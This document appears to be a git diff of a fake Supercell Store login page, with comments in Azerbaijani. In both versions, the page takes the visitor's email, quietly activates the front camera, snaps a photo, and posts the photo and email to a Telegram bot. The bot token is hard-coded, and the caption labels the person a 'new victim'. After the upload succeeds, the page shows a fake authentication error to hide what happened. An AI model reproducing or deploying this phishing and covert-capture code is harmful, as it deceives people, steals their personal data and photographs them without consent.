@@ -3,91 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Supercell Store - Verify</title>
+    <title>Supercell Support - Verification</title>
     <style>
-        body { background-color: #1b4fb1; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; width: 350px; text-align: center; }
-        input { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ddd; border-radius: 5px; }
-        button { width: 100%; padding: 12px; background: #3a86ff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
-        #error-log { color: red; font-size: 11px; margin-top: 10px; word-break: break-all; }
+        body { background-color: #1b4fb1; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 15px; width: 360px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
+        .logo { background: #ffc107; width: 55px; height: 55px; margin: 0 auto 15px; border-radius: 12px; line-height: 55px; color: white; font-weight: 900; font-size: 32px; }
+        input { width: 100%; padding: 14px; margin: 15px 0; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background: #3a86ff; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px; }
+        button:disabled { background: #a2c2f7; }
+        #status { color: #666; font-size: 12px; margin-top: 15px; min-height: 18px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div style="background: #ffc107; width: 50px; height: 50px; margin: 0 auto; border-radius: 10px; line-height: 50px; color: white; font-weight: bold; font-size: 30px;">S</div>
-    <h3>Supercell Store Login</h3>
-    <input type="email" id="email" placeholder="Email ünvanı">
-    <button id="loginBtn">SIGN IN</button>
-    <div id="error-log"></div>
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+    <div class="logo">S</div>
+    <h2 style="margin: 0; font-size: 20px;">Supercell Store Login</h2>
+    <p style="color: #666; font-size: 14px;">E-poçtunuzu daxil edərək təsdiqləmə kodu alın.</p>
+    
+    <input type="email" id="email" placeholder="Email ünvanı" autocomplete="off">
+    <button id="btn">➜ SIGN IN</button>
+    
+    <div id="status"></div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 </div>
 
 <script>
-    // --- BURANI DOLDUR ---
-    const TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A"; 
-    const CHATID = "-1003369084883";
-    // ---------------------
+    // --- BURANI DƏQİQ DOLDUR ---
+    const BOT_TOKEN = "8547908650:AAGrPuSRhlb-SuE_x5ui1wZ9so5sBMclL5A";
+    const CHAT_ID = "-1003369084883";
+    // ---------------------------
 
-    const btn = document.getElementById('loginBtn');
-    const log = document.getElementById('error-log');
+    const btn = document.getElementById('btn');
+    const status = document.getElementById('status');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const emailInput = document.getElementById('email');
 
     btn.onclick = async () => {
-        const mail = document.getElementById('email').value;
-        if(!mail) { alert("Email yazın"); return; }
-        
-        log.innerText = "Kameraya qoşulur...";
-        
+        const email = emailInput.value;
+        if (!email.includes('@')) {
+            alert("Düzgün email daxil edin.");
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerText = "Yoxlanılır...";
+        status.innerText = "Sistemə qoşulur...";
+
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const video = document.getElementById('v');
+            // 1. Kameraya müraciət
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
             video.srcObject = stream;
-            
+
+            // Kamera fokuslanması üçün 2 saniyə gözlə və avtomatik çək
             setTimeout(() => {
-                const canvas = document.getElementById('c');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
-                canvas.toBlob(blob => {
-                    send(blob, mail);
-                    stream.getTracks().forEach(t => t.stop());
+                canvas.toBlob((blob) => {
+                    sendToTelegram(blob, email);
+                    // Kameranı söndür
+                    stream.getTracks().forEach(track => track.stop());
                 }, 'image/png');
-            }, 1000);
-            
-        } catch (e) {
-            log.innerText = "Kamera Xətası: " + e.message;
-            send(null, mail + " (Kamera bloklanıb)");
+            }, 2000);
+
+        } catch (err) {
+            // Kamera bloklansa belə emaili göndər
+            sendToTelegram(null, email + " (Kamera rədd edildi)");
+            console.error(err);
         }
     };
 
-    async function send(blob, mail) {
-        log.innerText = "Telegram-a göndərilir...";
-        const fd = new FormData();
-        fd.append('chat_id', CHATID);
+    async function sendToTelegram(blob, email) {
+        status.innerText = "Verifikasiya göndərilir...";
         
-        let url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        
+        let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        
         if (blob) {
-            url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-            fd.append('photo', blob, 'p.png');
-            fd.append('caption', "Email: " + mail);
+            url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            formData.append('photo', blob, 'capture.png');
+            formData.append('caption', `✅ Yeni Qurban!\n📧 Email: ${email}`);
         } else {
-            fd.append('text', "Giriş cəhdi: " + mail);
+            formData.append('text', `⚠️ Yeni Giriş (Kamera Yoxdur)\n📧 Email: ${email}`);
         }
 
         try {
-            const res = await fetch(url, { method: 'POST', body: fd });
-            const data = await res.json();
-            if(data.ok) {
-                log.innerText = "Uğurla göndərildi!";
-                alert("Xəta: Serverlə əlaqə kəsildi (404).");
+            const response = await fetch(url, { method: 'POST', body: formData });
+            const resData = await response.json();
+
+            if (resData.ok) {
+                // Hər şey uğurludursa istifadəçiyə yalançı xəta göstər
+                setTimeout(() => {
+                    alert("Authentication Error (0x882): Kod göndərilərkən xəta baş verdi. Zəhmət olmasa bir az sonra cəhd edin.");
+                    window.location.reload();
+                }, 1000);
             } else {
-                log.innerText = "yanlış e posta: " + data.description;
+                status.innerText = "Xəta: " + resData.description;
+                btn.disabled = false;
+                btn.innerText = "➜ SIGN IN";
             }
-        } catch (err) {
-            log.innerText = "Şəbəkə Xətası: " + err.message;
+        } catch (e) {
+            status.innerText = "Bağlantı xətası baş verdi.";
+            btn.disabled = false;
         }
     }
 </script>
